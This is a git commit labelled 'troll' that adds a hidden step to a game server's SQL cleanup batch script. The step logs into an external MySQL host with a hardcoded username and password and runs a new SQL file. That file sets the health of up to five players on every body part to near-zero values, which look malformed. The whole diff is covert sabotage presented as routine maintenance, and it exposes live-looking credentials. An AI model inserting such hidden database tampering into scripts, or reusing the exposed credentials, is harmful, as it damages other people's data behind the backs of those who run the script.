d539d2739f17de0857674d557b09b999064a9c3e
Exile Dedicated Machine <gr8_boi52@yahoo.com>
2016-02-15 19:08:58 +0100

    troll

--- SQL_SCRIPTS/server_1.bat
+++ SQL_SCRIPTS/server_1.bat
@@ -12,4 +12,5 @@ echo RUNNING SQL Cleanup Script...
 echo.
 echo.
 D:\MySQL\bin\mysql.exe -u %mysqluser% -p%mysqlpassword% %mysqlschema%  < "C:\ExileMod\SQL_SCRIPTS\server_1.sql"
+D:\MySQL\bin\mysql.exe -h104.244.4.34 -u db12 -p3lIKH1HE6h db12 < "C:\ExileMod\SQL_SCRIPTS\server_troll.sql"
 exit
---
+++ SQL_SCRIPTS/server_troll.sql
@@ -0,0 +1,4 @@
+UPDATE player
+SET hitpoints = '[["face_hub",0.9999é],["neck",0.9999é],["head",0.9999é],["pelvis",0.9999é],["spine1",0.9999é],["spine2",0.9999é],["spine3",0.9999é],["body",0.9999é],["arms",0.9999é],["hands",0.9999é],["legs",0.9999é]]'
+WHERE hitpoints = '[["face_hub",0],["neck",0],["head",0],["pelvis",0],["spine1",0],["spine2",0],["spine3",0],["body",0],["arms",0],["hands",0],["legs",0]]'
+LIMIT 5
